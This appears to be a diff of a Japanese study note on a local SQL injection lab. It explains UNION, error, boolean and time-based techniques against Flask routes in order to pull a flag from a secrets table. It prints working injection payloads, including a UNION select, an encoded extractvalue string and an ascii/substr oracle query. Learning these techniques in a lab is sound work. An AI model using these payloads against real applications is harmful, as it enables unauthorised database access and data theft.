@@ -7,25 +7,23 @@ Web アプリケーションにおいてユーザが指定した値をもとに�
   - プログラムには `kv(id, k, v), secrets(id, data)` という 2 つのテーブルがある
   - secrets テーブルにフラグとなる文字列が含まれているので、攻撃して取得する
 
-- SELECT 文における攻撃方法
-
-  - UNION 句を用いた攻撃手法
-    - SQL 文の実行結果が直接ユーザに返却されるような状況において有効
-  - Error ベースの攻撃手法
-    - SQL 文の実行エラーの内容がユーザに出力されるような場合に有効（意図的に実行エラーを引き起こしエラー分の中に取得したいデータを出力させる)
-  - Boolean ベースの攻撃手法
-    - SQL 文の実行結果は直接ユーザに出力されないものの、実行結果に応じてレスポンスが変化するような状況において有効
-      （取得したいデータの 1 文字列目が A なら 0、そうでない場合は 1」と意図的にレスポンスを変化させることを繰り返す）
-  - Time ベースの攻撃手法
-    - SQL 文の実行結果が一切返却されていないような状況で有効。SLEEP 関数を利用し、意図的に応答時間を変化させる
-      （取得したいデータの 1 文字目が A なら 1 秒待機、そうでなければ待機しない」と意図的に応答時間を変化させる）
+## SELECT 文における攻撃方法
 
 - UNION 句を用いた攻撃手法
-  - `route_search_index`を攻撃対象とする。
-    - `select k,v from kv where k like '%" + key + "%';`はユーザからのキーをそのまま結合しているだけなので攻撃できそう
-    - `select k,v from kv where k like '%" union select 1, data from secrets;`のようなクエリを組み立ててみる
-      - 選択しているカラムは k,v の 2 つなので union する際のパディングとして適当な値(1)を指定する必要がある。
-    - パラメーター key に`' union select 1, data from secrets;#`を渡すとクエリが組み立てられる。
+  - SQL 文の実行結果が直接ユーザに返却されるような状況において有効
+- Error ベースの攻撃手法
+  - SQL 文の実行エラーの内容がユーザに出力されるような場合に有効（意図的に実行エラーを引き起こしエラー分の中に取得したいデータを出力させる)
+- Boolean ベースの攻撃手法
+  - SQL 文の実行結果は直接ユーザに出力されないものの、実行結果に応じてレスポンスが変化するような状況において有効
+    （取得したいデータの 1 文字列目が A なら 0、そうでない場合は 1」と意図的にレスポンスを変化させることを繰り返す）
+- Time ベースの攻撃手法
+
+  - SQL 文の実行結果が一切返却されていないような状況で有効。SLEEP 関数を利用し、意図的に応答時間を変化させる
+    （取得したいデータの 1 文字目が A なら 1 秒待機、そうでなければ待機しない」と意図的に応答時間を変化させる）
+
+### UNION 句を用いた攻撃手法
+
+- `route_search_index`を攻撃対象とする。
 
 ```python
 @app.route("/search", methods=["GET"])
@@ -53,10 +51,16 @@ def route_search_index():
     return render_template("index.html", data=data, ndata=len(data))
 ```
 
-- Error ベースの攻撃手法
-  http://localhost:5001/
+- `select k,v from kv where k like '%" + key + "%';`はユーザからのキーをそのまま結合しているだけなので攻撃できそう
+- `select k,v from kv where k like '%" union select 1, data from secrets;`のようなクエリを組み立ててみる
+  - 選択しているカラムは k,v の 2 つなので union する際のパディングとして適当な値(1)を指定する必要がある。
+- パラメーター key に`' union select 1, data from secrets;#`を渡すとクエリが組み立てられる。
 
-  - add の画面で文字列を入力すると 1 文字ごとにリクエストが飛んでいることを確認できる
+### Error ベースの攻撃手法
+
+http://localhost:5001/
+
+- add の画面で文字列を入力すると 1 文字ごとにリクエストが飛んでいることを確認できる
 
 ```python
 @app.route("/keyCheck", methods=["GET"])
@@ -99,18 +103,9 @@ def route_keycheck_index():
 
 `'%7C%7Cextractvalue%28null%2Cconcat%280x01%2C%28select%20data%20from%20secrets%29%29%29%3B%23`をキーとしてリクエストを送ると、、、
 
-- Boolean ベースの攻撃手法
+### Boolean ベースの攻撃手法
 
-  - エラー時の出力が`Error`になっている
-  - 取得できる 2 値のみを用いて全体の情報を取得する。（`SYBSTR関数`を用いて一文字ずつ使用済みかを確かめていく）
-    - `select k from kv where k = 'notusedkey' or 1=if((select ascii(substr(data,1,0)) from secrets)=65,1,0);`
-    - ASCII コードの 65(A)との比較を行い正しければ 1,異なれば 0 を返す
-    - アプリケーション側のコードで下記の部分に注目すると、OR 以降の値が偽であれば not used と文字列が出力されることになる
-    ```python
-        if len(data) == 0:
-        return "not used"
-    ```
-    - これを繰り繰り返すことで文字列の特定が可能になる
+- エラー時の出力が`Error`になっている(Error ベースの SQL インジェクションが使えなさそう、、、)
 
 ```python
 @app.route("/keyCheck", methods=["GET"])
@@ -136,9 +131,20 @@ def route_keycheck_index():
     return "used"
 ```
 
+- 取得できる 2 値のみを用いて全体の情報を取得する。（`SUBSTR関数`を用いて一文字ずつ使用済みかを確かめていく）
+
+  - `select k from kv where k = 'notusedkey' or 1=if((select ascii(substr(data,1,0)) from secrets)=65,1,0);`
+  - ASCII コードの 65(A)との比較を行い正しければ 1,異なれば 0 を返す
+  - アプリケーション側のコードで下記の部分に注目すると、OR 以降の値が偽であれば not used と文字列が出力されることになる
+
+  ```python
+      if len(data) == 0:
+      return "not used"
+  ```
+
+  - これを繰り繰り返すことで文字列の特定が可能になる
+
 - 手動でやるのはめんどいので、、、`python3 ../scripts/sqli-boolean-exploit.py`
 
 - Time ベースの攻撃手法
   - 考え方は boolean ベースのものと同じ感じなので割愛
-
-### INSERT/UPDATE 文における攻撃手法
